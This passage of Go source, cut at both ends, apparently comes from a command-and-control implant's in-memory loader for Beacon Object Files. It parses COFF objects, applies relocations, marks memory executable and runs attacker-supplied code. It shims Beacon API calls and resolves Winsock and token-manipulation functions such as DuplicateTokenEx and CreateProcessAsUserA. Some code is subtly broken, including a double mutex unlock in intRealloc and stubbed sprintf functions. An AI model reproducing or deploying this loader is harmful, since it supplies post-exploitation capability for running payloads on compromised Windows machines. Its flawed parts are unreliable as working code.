				i := 0
				for {
					b := *(*byte)(unsafe.Pointer(src + uintptr(i)))
					*(*byte)(unsafe.Pointer(dst + uintptr(dstLen+i))) = b
					if b == 0 {
						break
					}
					i++
					if i > 65536 {
						*(*byte)(unsafe.Pointer(dst + uintptr(dstLen+i))) = 0
						break
					}
				}

				// Debug: show result
				return dst
			})

		case coffFnStrncat:
			return windows.NewCallback(func(dst, src, n uintptr) uintptr {
				if dst == 0 || src == 0 {
					return dst
				}

				// Find end of dst string
				dstLen := 0
				for {
					if *(*byte)(unsafe.Pointer(dst + uintptr(dstLen))) == 0 {
						break
					}
					dstLen++
					if dstLen > 65536 {
						return dst
					}
				}

				// Copy up to n characters from src
				copied := 0
				for i := 0; i < int(n); i++ {
					b := *(*byte)(unsafe.Pointer(src + uintptr(i)))
					if b == 0 {
						break
					}
					*(*byte)(unsafe.Pointer(dst + uintptr(dstLen+i))) = b
					copied++
				}

				// Null terminate
				*(*byte)(unsafe.Pointer(dst + uintptr(dstLen+copied))) = 0

				return dst
			})
		case coffFnStrstr:
			return windows.NewCallback(func(haystack, needle uintptr) uintptr {
				if haystack == 0 || needle == 0 {
					return 0
				}

				// Get needle length
				needleLen := 0
				for {
					if *(*byte)(unsafe.Pointer(needle + uintptr(needleLen))) == 0 {
						break
					}
					needleLen++
					if needleLen > 65536 {
						return 0
					}
				}

				if needleLen == 0 {
					return haystack
				}

				// Search for needle in haystack
				i := 0
				for {
					h := *(*byte)(unsafe.Pointer(haystack + uintptr(i)))
					if h == 0 {
						break
					}

					// Check if needle matches at this position
					match := true
					for j := 0; j < needleLen; j++ {
						h2 := *(*byte)(unsafe.Pointer(haystack + uintptr(i+j)))
						n := *(*byte)(unsafe.Pointer(needle + uintptr(j)))
						if h2 != n {
							match = false
							break
						}
					}

					if match {
						return haystack + uintptr(i)
					}

					i++
					if i > 65536 {
						break
					}
				}

				return 0
			})

		case coffFnCalloc:
			return windows.NewCallback(func(num, size uintptr) uintptr {
				totalSize := num * size
				if totalSize == 0 {
					return 0
				}

				// Allocate memory
				mem := make([]byte, totalSize)
				ptr := uintptr(unsafe.Pointer(&mem[0]))

				// Store in allocatedMemory map
				allocMutex.Lock()
				allocatedMemory[ptr] = mem
				allocMutex.Unlock()

				// Zero the memory (Go already does this, but be explicit)
				for i := uintptr(0); i < totalSize; i++ {
					*(*byte)(unsafe.Pointer(ptr + i)) = 0
				}

				return ptr
			})

		case coffFnMalloc:
			return windows.NewCallback(func(size uintptr) uintptr {
				if size == 0 {
					return 0
				}

				mem := make([]byte, size)
				ptr := uintptr(unsafe.Pointer(&mem[0]))

				allocMutex.Lock()
				allocatedMemory[ptr] = mem
				allocMutex.Unlock()

				return ptr
			})

		case coffFnFree:
			return windows.NewCallback(func(ptr uintptr) uintptr {
				if ptr == 0 {
					return 0
				}

				allocMutex.Lock()
				if _, exists := allocatedMemory[ptr]; exists {
					delete(allocatedMemory, ptr)
				}
				allocMutex.Unlock()

				return 0
			})

		case coffFnRealloc:
			return windows.NewCallback(func(ptr, size uintptr) uintptr {
				if size == 0 {
					// Free the memory
					if ptr != 0 {
						allocMutex.Lock()
						delete(allocatedMemory, ptr)
						allocMutex.Unlock()
					}
					return 0
				}

				if ptr == 0 {
					// Act like malloc
					mem := make([]byte, size)
					newPtr := uintptr(unsafe.Pointer(&mem[0]))

					allocMutex.Lock()
					allocatedMemory[newPtr] = mem
					allocMutex.Unlock()

					return newPtr
				}

				// Reallocate
				allocMutex.Lock()
				oldMem, exists := allocatedMemory[ptr]
				if !exists {
					allocMutex.Unlock()
					// Pointer not found, just allocate new
					mem := make([]byte, size)
					newPtr := uintptr(unsafe.Pointer(&mem[0]))

					allocMutex.Lock()
					allocatedMemory[newPtr] = mem
					allocMutex.Unlock()

					return newPtr
				}

				newMem := make([]byte, size)
				copySize := len(oldMem)
				if int(size) < copySize {
					copySize = int(size)
				}
				copy(newMem, oldMem[:copySize])

				delete(allocatedMemory, ptr)
				newPtr := uintptr(unsafe.Pointer(&newMem[0]))
				allocatedMemory[newPtr] = newMem
				allocMutex.Unlock()

				return newPtr
			})

		case coffFnMemcpy:
			return windows.NewCallback(func(dst, src, size uintptr) uintptr {
				if dst == 0 || src == 0 || size == 0 {
					return dst
				}
				for i := uintptr(0); i < size; i++ {
					*(*byte)(unsafe.Pointer(dst + i)) = *(*byte)(unsafe.Pointer(src + i))
				}
				return dst
			})

		case coffFnMemset:
			return windows.NewCallback(func(ptr, value, size uintptr) uintptr {
				if ptr == 0 || size == 0 {
					return ptr
				}
				val := byte(value)
				for i := uintptr(0); i < size; i++ {
					*(*byte)(unsafe.Pointer(ptr + i)) = val
				}
				return ptr
			})

		case coffFnMemmove:
			return windows.NewCallback(func(dst, src, size uintptr) uintptr {
				if dst == 0 || src == 0 || size == 0 {
					return dst
				}
				// Handle overlapping regions
				if dst < src || dst >= src+size {
					// Non-overlapping or dst before src
					for i := uintptr(0); i < size; i++ {
						*(*byte)(unsafe.Pointer(dst + i)) = *(*byte)(unsafe.Pointer(src + i))
					}
				} else {
					// Overlapping with dst after src
					for i := size; i > 0; i-- {
						*(*byte)(unsafe.Pointer(dst + i - 1)) = *(*byte)(unsafe.Pointer(src + i - 1))
					}
				}
				return dst
			})

		case coffFnMemcmp:
			return windows.NewCallback(func(ptr1, ptr2, size uintptr) uintptr {
				if ptr1 == 0 && ptr2 == 0 {
					return 0
				}
				if ptr1 == 0 {
					return uintptr(uint64(0xFFFFFFFFFFFFFFFF))
				}
				if ptr2 == 0 {
					return 1
				}

				for i := uintptr(0); i < size; i++ {
					b1 := *(*byte)(unsafe.Pointer(ptr1 + i))
					b2 := *(*byte)(unsafe.Pointer(ptr2 + i))
					if b1 != b2 {
						if b1 < b2 {
							return uintptr(uint64(0xFFFFFFFFFFFFFFFF))
						}
						return 1
					}
				}
				return 0
			})

		case coffFnVsnprintf, coffFnVsnprintfU:
			// Simplified vsnprintf - just return 0 for now
			return windows.NewCallback(func(buffer, size, format, args uintptr) uintptr {
				return 0
			})

		case coffFnSprintf:
			// Simplified sprintf
			return windows.NewCallback(func(buffer, format, arg0, arg1, arg2, arg3, arg4 uintptr) uintptr {
				return 0
			})

		// User32 functions
		case coffApiMessageBoxA, coffApiMessageBoxW, coffApiGetDesktopWindow, coffApiGetForegroundWnd,
			coffApiGetWindowTextA, coffApiGetWindowTextW, coffApiFindWindowA, coffApiFindWindowW:
			libName = coffDllUser32

		// WS2_32 functions (Winsock)
		case coffApiWSAStartup, coffApiWSACleanup, coffApiWSAGetLastErr, coffApiSocket, coffApiClosesocket,
			coffApiBind, coffApiListen, coffApiAccept, coffApiConnect, coffApiSend, coffApiRecv, coffApiSendto,
			coffApiRecvfrom, coffApiSelect, coffApiGethostbyname, coffApiGethostbyaddr, coffApiInet_addr,
			coffApiInet_ntoa, coffApiHtons, coffApiHtonl, coffApiNtohs, coffApiNtohl:
			libName = coffDllWs2_32

		// Advapi32 functions
		case coffApiRegOpenKeyExA, coffApiRegCloseKey, coffApiRegQueryValueExA, coffApiRegSetValueExA,
			coffApiOpenProcessToken, coffApiGetTokenInformation, coffApiSetTokenInformation,
			coffApiDuplicateTokenEx, coffApiCreateProcessAsUserA:
			libName = coffDllAdvapi32

		// Beacon API functions
		case coffFnBeaconOutput:
			return windows.NewCallback(GetCoffOutputForChannel(outChannel))

		case coffFnBeaconDataParse:
			return windows.NewCallback(func(parser uintptr, buffer uintptr, size uintptr) uintptr {
				p := (*DataParser)(unsafe.Pointer(parser))
				p.original = buffer
				p.buffer = buffer
				p.length = uint32(size)
				p.size = uint32(size)

				return 0
			})

		case coffFnBeaconDataInt:
			return windows.NewCallback(func(parser uintptr) uintptr {
				p := (*DataParser)(unsafe.Pointer(parser))
				var size uint32
				result := DataInt(p, &size)
				return result
			})

		case coffFnBeaconDataShort:
			return windows.NewCallback(func(parser uintptr) uintptr {
				p := (*DataParser)(unsafe.Pointer(parser))

				// Need 4 bytes for length prefix + 2 bytes for the short value
				if p.length < 4 {
					return 0
				}

				// Read 4-byte length prefix (standard BOF/Beacon format)
				_ = *(*uint32)(unsafe.Pointer(p.buffer))
				p.buffer += 4
				p.length -= 4

				if p.length < 2 {
					return 0
				}

				// Read the actual short value
				value := *(*uint16)(unsafe.Pointer(p.buffer))
				p.buffer += 2
				p.length -= 2

				return uintptr(value)
			})

		case coffFnBeaconDataLength:
			return windows.NewCallback(func(parser uintptr) uintptr {
				p := (*DataParser)(unsafe.Pointer(parser))
				return DataLength(p)
			})

		case coffFnBeaconDataExtract:
			return windows.NewCallback(func(parser uintptr, sizePtr uintptr) uintptr {
				p := (*DataParser)(unsafe.Pointer(parser))

				// Need at least 4 bytes for the length prefix
				if p.length < 4 {
					if sizePtr != 0 {
						*(*uint32)(unsafe.Pointer(sizePtr)) = 0
					}
					return 0
				}

				// Read 4-byte length prefix (standard BOF/Beacon format)
				binLen := *(*uint32)(unsafe.Pointer(p.buffer))
				p.buffer += 4
				p.length -= 4

				if binLen > p.length {
					if sizePtr != 0 {
						*(*uint32)(unsafe.Pointer(sizePtr)) = 0
					}
					return 0
				}

				// Return the pointer directly from the original buffer
				dataPtr := p.buffer

				p.buffer += uintptr(binLen)
				p.length -= binLen

				// Set size if requested
				if sizePtr != 0 {
					*(*uint32)(unsafe.Pointer(sizePtr)) = binLen
				}

				return dataPtr
			})

		case coffFnBeaconPrintf:
			return windows.NewCallback(GetCoffPrintfForChannel(outChannel))

		case coffFnBeaconFormatAlloc, coffFnBeaconFormatFree, coffFnBeaconFormatAppend,
			coffFnBeaconFormatPrintf, coffFnBeaconFormatToStr, coffFnBeaconFormatInt:
			// Stubs for now
			return 0

		// Helper functions from base.c
		case coffFnBofstart:
			return windows.NewCallback(bofStart)
		case coffFnInternalPrintf:
			return windows.NewCallback(GetInternalPrintfForChannel(outChannel))
		case coffFnPrintoutput:
			return windows.NewCallback(printOutput)
		case coffFnIntAlloc:
			return windows.NewCallback(intAlloc)
		case coffFnIntFree:
			return windows.NewCallback(intFree)
		case coffFnIntMemset:
			return windows.NewCallback(intMemset)
		case coffFnIntMemcpy:
			return windows.NewCallback(intMemcpy)
		case coffFnIntRealloc:
			return windows.NewCallback(intRealloc)
		case coffFnIntStrlen:
			return windows.NewCallback(intStrlen)
		case coffFnIntStrcmp:
			return windows.NewCallback(intStrcmp)
		case coffFnIntStrncmp:
			return windows.NewCallback(intStrncmp)
		case coffFnIntStrcpy:
			return windows.NewCallback(intStrcpy)
		case coffFnIntStrncpy:
			return windows.NewCallback(intStrncpy)
		case coffFnIntStrcat:
			return windows.NewCallback(intStrcat)
		case coffFnIntStrncat:
			return windows.NewCallback(intStrncat)
		case coffFnToWideChar:
			return windows.NewCallback(toWideChar)
		case coffFnUtf8ToUtf16:
			return windows.NewCallback(Utf8ToUtf16)
		case coffFnUtf16ToUtf8:
			return windows.NewCallback(Utf16ToUtf8)

		default:
			return 0
		}
	}

	if libName != "" && procName != "" {
		hModule, err := syscall.LoadLibrary(libName)
		if err != nil {
			return 0
		}

		addr, err := syscall.GetProcAddress(hModule, procName)
		if err != nil {
			return 0
		}

		return addr
	}

	return 0
}

// Load with default 30-second timeout for backward compatibility
func Load(coffBytes []byte, argBytes []byte) (string, error) {
	if len(coffBytes) < 20 {
		return "", fmt.Errorf(ErrCtx(E2, fmt.Sprintf("%d", len(coffBytes))))
	}
	return LoadWithTimeout(coffBytes, argBytes, 30*time.Second)
}

// LoadWithTimeout allows specifying a custom timeout
func LoadWithTimeout(coffBytes []byte, argBytes []byte, timeout time.Duration) (string, error) {
	if len(coffBytes) < 20 {
		return "", fmt.Errorf(ErrCtx(E2, fmt.Sprintf("%d", len(coffBytes))))
	}
	return LoadWithMethodAndTimeout(coffBytes, argBytes, "go", timeout)
}

// LoadWithMethod with default 30-second timeout (keep your existing LoadWithMethod but modify it to call the new function)
func LoadWithMethod(coffBytes []byte, argBytes []byte, method string) (string, error) {
	return LoadWithMethodAndTimeout(coffBytes, argBytes, method, 30*time.Second)
}

// LoadWithMethodAndTimeout is the main implementation with configurable timeout
// This is your existing LoadWithMethod function, but renamed and with timeout parameter
func LoadWithMethodAndTimeout(coffBytes []byte, argBytes []byte, method string, timeout time.Duration) (string, error) {
	// Ensure DLLs are initialized (requires SetCOFFTemplate to be called first)
	if err := initCOFFDLLs(); err != nil {
		return "", fmt.Errorf("failed to initialize COFF DLLs: %w", err)
	}

	output := make(chan interface{}, 100)

	// Add panic recovery for the entire load process
	defer func() {
		if r := recover(); r != nil {
		}
	}()

	// Parse COFF
	parsedCoff := pecoff.Explore(binutil.WrapByteSlice(coffBytes))
	parsedCoff.ReadAll()
	parsedCoff.Seal()

	if parsedCoff.Sections.Len() == 0 {
		return "", fmt.Errorf(Err(E2))
	}

	// Calculate sizes for special sections
	gotSize := uint32(0)
	bssSize := uint32(0)
	gotMap := make(map[string]uintptr)

	for _, symbol := range parsedCoff.Symbols {
		if symbol.StorageClass == windef.IMAGE_SYM_CLASS_EXTERNAL && symbol.SectionNumber == 0 {
			symbolName := symbol.NameString()
			if strings.HasPrefix(symbolName, coffPrefixImp) {
				// Check for duplicate GOT entries
				if _, exists := gotMap[symbolName]; !exists {
					gotMap[symbolName] = 0 // Placeholder
					gotSize += 8
				}
			} else {
				// BSS symbol - don't add extra padding
				bssSize += symbol.Value
			}
		}
	}

	// Align BSS size to 16 bytes if needed
	if bssSize > 0 {
		bssSize = (bssSize + 15) &^ 15
	}

	// Allocate sections
	sectionAddresses := make([]uintptr, parsedCoff.Sections.Len())
	sections := make(map[string]CoffSection)
	var allocatedMemory []uintptr

	for i, section := range parsedCoff.Sections.Array() {
		sectionName := section.NameString()
		allocationSize := uintptr(section.SizeOfRawData)

		// Handle BSS section specially
		if strings.HasPrefix(sectionName, coffSectionBss) {
			if bssSize > 0 {
				allocationSize = uintptr(bssSize)
			} else if section.VirtualSize > 0 {
				allocationSize = uintptr(section.VirtualSize)
			} else if allocationSize == 0 {
				allocationSize = 4096 // Default size
			}
		}

		// Handle other zero-sized sections
		if allocationSize == 0 && section.VirtualSize > 0 {
			allocationSize = uintptr(section.VirtualSize)
		}

		if allocationSize == 0 {
			continue
		}

		// Add upper bound check
		if allocationSize > 0x10000000 { // 256MB limit
			return "", fmt.Errorf(ErrCtx(E2, sectionName))
		}

		// Allocate memory
		addr, _, err := procVirtualAlloc.Call(0, allocationSize, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
		if addr == 0 {
			return "", fmt.Errorf(ErrCtx(E44, sectionName))
			_ = err
		}

		allocatedMemory = append(allocatedMemory, addr)
		sectionAddresses[i] = addr

		// Copy section data
		if len(section.RawData()) > 0 && !strings.HasPrefix(sectionName, coffSectionBss) {
			copySize := min(len(section.RawData()), int(allocationSize))
			_, _, err = procRtlCopyMemory.Call(
				addr,
				uintptr(unsafe.Pointer(&section.RawData()[0])),
				uintptr(copySize),
			)
			if !errors.Is(err, syscall.Errno(0)) {
				return "", fmt.Errorf(Err(E44))
			}
		}

		sections[sectionName] = CoffSection{
			Section: section,
			Address: addr,
		}
	}

	// Allocate GOT
	gotBaseAddress := uintptr(0)
	if gotSize > 0 {
		addr, _, err := procVirtualAlloc.Call(0, uintptr(gotSize), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
		if addr == 0 {
			return "", fmt.Errorf(Err(E44))
			_ = err
		}
		gotBaseAddress = addr
		allocatedMemory = append(allocatedMemory, addr)
	}

	// Process relocations
	gotOffset := 0
	gotAllocs := make(map[string]uintptr)
	bssOffset := 0

	for sectionIdx, section := range parsedCoff.Sections.Array() {
		sectionAddress := sectionAddresses[sectionIdx]
		if sectionAddress == 0 {
			continue
		}

		for _, reloc := range section.Relocations() {
			if reloc.SymbolTableIndex >= uint32(len(parsedCoff.Symbols)) {
				continue
			}

			symbol := parsedCoff.Symbols[reloc.SymbolTableIndex]

			// Skip certain storage classes
			if symbol.StorageClass > 3 && symbol.StorageClass != windef.IMAGE_SYM_CLASS_EXTERNAL {
				continue
			}

			symbolDefAddress := uintptr(0)

			// Resolve symbol address
			if symbol.StorageClass == windef.IMAGE_SYM_CLASS_EXTERNAL && symbol.SectionNumber == 0 {
				// External symbol
				symbolName := symbol.NameString()
				if strings.HasPrefix(symbolName, coffPrefixImp) {
					// Import symbol - check if already resolved
					if existingAddr, exists := gotAllocs[symbolName]; exists {
						symbolDefAddress = existingAddr
					} else {
						externalAddress := resolveExternalAddress(symbolName, output)
						if externalAddress == 0 {
							continue
						}

						// Allocate GOT entry
						if gotBaseAddress == 0 {
							return "", fmt.Errorf(Err(E44))
						}

						symbolDefAddress = gotBaseAddress + uintptr(gotOffset*8)
						gotOffset++

						// Write address to GOT
						*(*uintptr)(unsafe.Pointer(symbolDefAddress)) = externalAddress
						gotAllocs[symbolName] = symbolDefAddress
					}
				} else {
					// BSS symbol
					bssSection := sections[coffSectionBss]
					if bssSection.Address != 0 {
						symbolDefAddress = bssSection.Address + uintptr(bssOffset)
						bssOffset += int(symbol.Value)
						if symbol.Value == 0 {
							bssOffset += 8 // Default size for zero-sized BSS symbols
						}
					}
				}
			} else if symbol.SectionNumber > 0 && int(symbol.SectionNumber) <= len(sectionAddresses) {
				// Regular symbol pointing to a section
				targetSectionAddr := sectionAddresses[symbol.SectionNumber-1]
				if targetSectionAddr == 0 {
					continue
				}
				symbolDefAddress = targetSectionAddr + uintptr(symbol.Value)
			} else {
				continue
			}

			// Apply relocation
			err := applyRelocation(sectionAddress, reloc, symbolDefAddress, section.RawData())
			if err != nil {
				continue
			}
		}

		// Set memory protection for executable sections
		if section.Characteristics&IMAGE_SCN_MEM_EXECUTE != 0 {
			oldProtect := uint32(0)
			_, _, err := procVirtualProtect.Call(
				sectionAddress,
				uintptr(section.SizeOfRawData),
				PAGE_EXECUTE_READ,
				uintptr(unsafe.Pointer(&oldProtect)),
			)
			if !errors.Is(err, syscall.Errno(0)) {
			}
		}
	}

	// Execute entry point
	go func() {
		defer close(output)
		defer func() {
			if r := recover(); r != nil {
				output <- ErrCtx(E51, fmt.Sprintf("%v", r))
			}

			// Clean up BOF allocations
			cleanupBOFAllocations()

			// Clean up allocated memory after execution
			for _, addr := range allocatedMemory {
				procVirtualFree.Call(addr, 0, 0x8000) // MEM_RELEASE
			}
			// Log execution time
		}()

		// Find entry point
		entryPointFound := false
		for _, symbol := range parsedCoff.Symbols {
			if symbol.NameString() == method {
				if symbol.SectionNumber <= 0 || int(symbol.SectionNumber) > len(sectionAddresses) {
					output <- Err(E2)
					return
				}

				entryPoint := sectionAddresses[symbol.SectionNumber-1] + uintptr(symbol.Value)

				// Log entry point for debugging

				// Prepare arguments
				var argPtr uintptr
				var argLen int
				var pinnedArgBytes []byte // Keep this alive during execution

				if len(argBytes) > 0 {
					// IMPORTANT: Allocate persistent memory for arguments
					// The BOF will get pointers into this buffer, so it must remain valid
					argLen = len(argBytes)

					// Use VirtualAlloc to ensure the memory isn't moved by GC
					argAddr, _, _ := procVirtualAlloc.Call(
						0,
						uintptr(argLen),
						MEM_COMMIT|MEM_RESERVE,
						PAGE_READWRITE,
					)

					if argAddr != 0 {
						// Copy arguments to the allocated memory
						for i := 0; i < argLen; i++ {
							*(*byte)(unsafe.Pointer(argAddr + uintptr(i))) = argBytes[i]
						}
						argPtr = argAddr

						// Track this allocation for cleanup
						allocatedMemory = append(allocatedMemory, argAddr)

					} else {
						// Fallback: pin the Go slice
						pinnedArgBytes = make([]byte, argLen)
						copy(pinnedArgBytes, argBytes)
						argPtr = uintptr(unsafe.Pointer(&pinnedArgBytes[0]))

					}
				} else {
					// Pass empty buffer
					emptyBuf := make([]byte, 1)
					pinnedArgBytes = emptyBuf // Keep it alive
					argPtr = uintptr(unsafe.Pointer(&emptyBuf[0]))
					argLen = 0
				}

				// Call entry point

				// Debug: Print the first few bytes of the argument buffer
				if argLen > 0 && argLen < 100 {
					for i := 0; i < argLen && i < 32; i++ {
					}
				}

				// Set timeout for BOF execution based on parameter
				done := make(chan bool, 1)
				go func() {
					// Keep pinnedArgBytes alive during execution
					_ = pinnedArgBytes

					ret, _, err := syscall.SyscallN(entryPoint, argPtr, uintptr(argLen))

					if !errors.Is(err, syscall.Errno(0)) {
						output <- ErrCtx(E51, fmt.Sprintf("0x%x", ret))
					} else {
					}
					done <- true
				}()

				// THIS IS THE KEY CHANGE - USE THE TIMEOUT PARAMETER
				// Wait for completion with the specified timeout
				select {
				case <-done:
					// BOF completed normally
				case <-time.After(timeout): // THIS LINE CHANGED - NOW USES THE TIMEOUT PARAMETER
					// Provide helpful message based on timeout duration
					output <- Err(E9)
				}

				entryPointFound = true
				break
			}
		}

		if !entryPointFound {
			output <- Err(E4)
		}
	}()

	// Collect output
	result := ""
	for msg := range output {
		result += fmt.Sprintf("%v\n", msg)
	}

	return result, nil
}

func applyRelocation(sectionAddress uintptr, reloc windef.Relocation, symbolAddress uintptr, sectionData []byte) error {
	targetAddress := sectionAddress + uintptr(reloc.VirtualAddress)

	// Validate relocation offset
	if reloc.VirtualAddress >= uint32(len(sectionData)) && len(sectionData) > 0 {
		// Some relocations might point beyond section data for BSS references
		// Don't fail, just warn
	}

	// Read existing value at relocation site for REL32 relocations
	existingValue := int32(0)
	if reloc.Type >= windef.IMAGE_REL_AMD64_REL32 && reloc.Type <= windef.IMAGE_REL_AMD64_REL32_5 {
		if reloc.VirtualAddress+4 <= uint32(len(sectionData)) && len(sectionData) > 0 {
			existingValue = int32(binary.LittleEndian.Uint32(sectionData[reloc.VirtualAddress:]))
		}
	}

	switch reloc.Type {
	case windef.IMAGE_REL_AMD64_ADDR64:
		// 64-bit absolute address
		*(*uint64)(unsafe.Pointer(targetAddress)) = uint64(symbolAddress)

	case windef.IMAGE_REL_AMD64_ADDR32NB:
		// 32-bit address without image base
		*(*uint32)(unsafe.Pointer(targetAddress)) = uint32(symbolAddress)

	case windef.IMAGE_REL_AMD64_REL32:
		// 32-bit relative address from byte following relocation
		relativeAddr := int32(symbolAddress) - int32(targetAddress+4) + existingValue
		*(*int32)(unsafe.Pointer(targetAddress)) = relativeAddr

	case windef.IMAGE_REL_AMD64_REL32_1:
		// REL32 with adjustment of 1
		relativeAddr := int32(symbolAddress) - int32(targetAddress+4) - 1 + existingValue
		*(*int32)(unsafe.Pointer(targetAddress)) = relativeAddr

	case windef.IMAGE_REL_AMD64_REL32_2:
		// REL32 with adjustment of 2
		relativeAddr := int32(symbolAddress) - int32(targetAddress+4) - 2 + existingValue
		*(*int32)(unsafe.Pointer(targetAddress)) = relativeAddr

	case windef.IMAGE_REL_AMD64_REL32_3:
		// REL32 with adjustment of 3
		relativeAddr := int32(symbolAddress) - int32(targetAddress+4) - 3 + existingValue
		*(*int32)(unsafe.Pointer(targetAddress)) = relativeAddr

	case windef.IMAGE_REL_AMD64_REL32_4:
		// REL32 with adjustment of 4
		relativeAddr := int32(symbolAddress) - int32(targetAddress+4) - 4 + existingValue
		*(*int32)(unsafe.Pointer(targetAddress)) = relativeAddr

	case windef.IMAGE_REL_AMD64_REL32_5:
		// REL32 with adjustment of 5
		relativeAddr := int32(symbolAddress) - int32(targetAddress+4) - 5 + existingValue
		*(*int32)(unsafe.Pointer(targetAddress)) = relativeAddr

	default:
		return fmt.Errorf(Err(E2))
	}

	return nil
}

// BOF Helper Functions

// BOF start function - initializes output buffer
func bofStart() int {
	// fmt.Printf("[DEBUG bofstart] Called - initializing output buffer\n")
	bofOutputMutex.Lock()
	bofOutputBuffer = nil
	bofOutputMutex.Unlock()
	return 1 // Return success
}

// Print output function - flushes output
func printOutput(flush int) {
	// fmt.Printf("[DEBUG printoutput] Called with flush=%d\n", flush)
	if flush != 0 {
		bofOutputMutex.Lock()
		if len(bofOutputBuffer) > 0 {
			// fmt.Printf("[DEBUG printoutput] Flushing %d bytes of buffered output\n", len(bofOutputBuffer))
			// Output is already being sent through the channel
		}
		bofOutputMutex.Unlock()
	}
}

// Internal printf function for BOFs
func GetInternalPrintfForChannel(channel chan<- interface{}) func(uintptr, uintptr, uintptr, uintptr, uintptr, uintptr, uintptr, uintptr, uintptr, uintptr, uintptr) uintptr {
	return func(format uintptr, arg0 uintptr, arg1 uintptr, arg2 uintptr, arg3 uintptr, arg4 uintptr, arg5 uintptr, arg6 uintptr, arg7 uintptr, arg8 uintptr, arg9 uintptr) uintptr {

		if format == 0 {
			return 0
		}

		formatStr := ReadCStringFromPtr(format)

		// Count actual format specifiers (skip %%)
		numArgs := 0
		for i := 0; i < len(formatStr)-1; i++ {
			if formatStr[i] == '%' {
				if formatStr[i+1] != '%' {
					numArgs++
				} else {
					i++ // Skip %%
				}
			}
		}


		args := []uintptr{arg0, arg1, arg2, arg3, arg4, arg5, arg6, arg7, arg8, arg9}

		// Format the string
		output := ""
		argIndex := 0
		i := 0

		for i < len(formatStr) {
			if formatStr[i] == '%' && i+1 < len(formatStr) {
				if formatStr[i+1] == '%' {
					output += "%"
					i += 2
					continue
				}

				// Parse format specifier
				i++ // Skip %

				// Skip flags (-, +, space, #, 0)
				for i < len(formatStr) && strings.ContainsRune("-+ #0", rune(formatStr[i])) {
					i++
				}

				// Skip width
				for i < len(formatStr) && formatStr[i] >= '0' && formatStr[i] <= '9' {
					i++
				}

				// Skip precision
				if i < len(formatStr) && formatStr[i] == '.' {
					i++
					for i < len(formatStr) && formatStr[i] >= '0' && formatStr[i] <= '9' {
						i++
					}
				}

				// Check length modifier
				lengthMod := ""
				if i < len(formatStr) {
					if formatStr[i] == 'l' {
						lengthMod = "l"
						i++
						if i < len(formatStr) && formatStr[i] == 'l' {
							lengthMod = "ll"
							i++
						}
					} else if formatStr[i] == 'h' {
						i++
					}
				}

				// Get conversion specifier
				if i < len(formatStr) && argIndex < len(args) {
					spec := formatStr[i]
					arg := args[argIndex]
					argIndex++

					switch spec {
					case 's':
						s := ReadCStringFromPtr(arg)
						output += s
					case 'S': // Wide string
						s := ReadWStringFromPtr(arg)
						output += s
					case 'd', 'i':
						if lengthMod == "ll" {
							output += fmt.Sprintf("%d", int64(arg))
						} else {
							output += fmt.Sprintf("%d", int32(arg))
						}
					case 'u':
						if lengthMod == "ll" {
							output += fmt.Sprintf("%d", uint64(arg))
						} else {
							output += fmt.Sprintf("%d", uint32(arg))
						}
					case 'x':
						output += fmt.Sprintf("%x", uint32(arg))
					case 'X':
						output += fmt.Sprintf("%X", uint32(arg))
					case 'p':
						output += fmt.Sprintf("0x%x", arg)
					case 'c':
						output += string(byte(arg))
					default:
						// Just append the character
						output += string(spec)
					}
					i++
				} else {
					// No more args
					break
				}
			} else {
				output += string(formatStr[i])
				i++
			}
		}

		// fmt.Printf("[DEBUG internal_printf] Formatted output: %s\n", output)

		// CRITICAL: Add to global buffer for async BOF monitoring
		outputBytes := []byte(output)
		bofOutputMutex.Lock()
		bofOutputBuffer = append(bofOutputBuffer, outputBytes...)
		_ = len(bofOutputBuffer)
		bofOutputMutex.Unlock()

		// Also send to channel if provided (for non-async BOFs)
		if channel != nil {
			select {
			case channel <- output:
			default:
			}
		}

		return uintptr(len(output))
	}
}

// Memory management functions
func intAlloc(size int) uintptr {
	if size <= 0 {
		return 0
	}

	// Align size to 16 bytes for better compatibility
	alignedSize := (size + 15) &^ 15

	bofAllocMutex.Lock()
	defer bofAllocMutex.Unlock()

	// Allocate memory using VirtualAlloc to ensure it's not garbage collected
	addr, _, _ := procVirtualAlloc.Call(
		0,
		uintptr(alignedSize),
		MEM_COMMIT|MEM_RESERVE,
		PAGE_READWRITE,
	)

	if addr == 0 {
		// Fallback to Go allocation
		mem := make([]byte, alignedSize)
		ptr := uintptr(unsafe.Pointer(&mem[0]))
		bofAllocations[ptr] = mem
		allocatedMemory[ptr] = mem

		// Zero the memory explicitly
		for i := 0; i < alignedSize; i++ {
			mem[i] = 0
		}

		return ptr
	}

	// Track the allocation
	bofAllocations[addr] = nil // Mark as VirtualAlloc'd

	// Zero the memory explicitly and verify
	for i := 0; i < alignedSize; i++ {
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = 0
	}

	// Verify the memory is zeroed
	_ = *(*byte)(unsafe.Pointer(addr))

	return addr
}

func intFree(ptr uintptr) uintptr {

	if ptr == 0 {
		return 0
	}

	bofAllocMutex.Lock()
	defer bofAllocMutex.Unlock()

	// Check if it's a VirtualAlloc'd block
	if mem, exists := bofAllocations[ptr]; exists {
		if mem == nil {
			// This was VirtualAlloc'd, use VirtualFree
			procVirtualFree.Call(ptr, 0, 0x8000) // MEM_RELEASE
		}
		delete(bofAllocations, ptr)
	}

	// Also check the old allocatedMemory map
	allocMutex.Lock()
	delete(allocatedMemory, ptr)
	allocMutex.Unlock()

	return 0
}

func intRealloc(ptr uintptr, size int) uintptr {

	if size <= 0 {
		intFree(ptr)
		return 0
	}

	allocMutex.Lock()
	defer allocMutex.Unlock()

	oldMem, exists := allocatedMemory[ptr]
	if !exists {
		// If pointer doesn't exist, just allocate new
		allocMutex.Unlock()
		return intAlloc(size)
	}

	newMem := make([]byte, size)
	copySize := len(oldMem)
	if size < copySize {
		copySize = size
	}
	copy(newMem, oldMem[:copySize])

	delete(allocatedMemory, ptr)
	newPtr := uintptr(unsafe.Pointer(&newMem[0]))
	allocatedMemory[newPtr] = newMem

	return newPtr
}

func intMemcpy(dst uintptr, src uintptr, size int) uintptr {
	for i := 0; i < size; i++ {
		*(*byte)(unsafe.Pointer(dst + uintptr(i))) = *(*byte)(unsafe.Pointer(src + uintptr(i)))
	}
	return dst
}

func intMemset(ptr uintptr, value int, size int) uintptr {
	for i := 0; i < size; i++ {
		*(*byte)(unsafe.Pointer(ptr + uintptr(i))) = byte(value)
	}
	return ptr
}

// String functions
func intStrlen(str uintptr) int {
	if str == 0 {
		return 0
	}

	length := 0
	for {
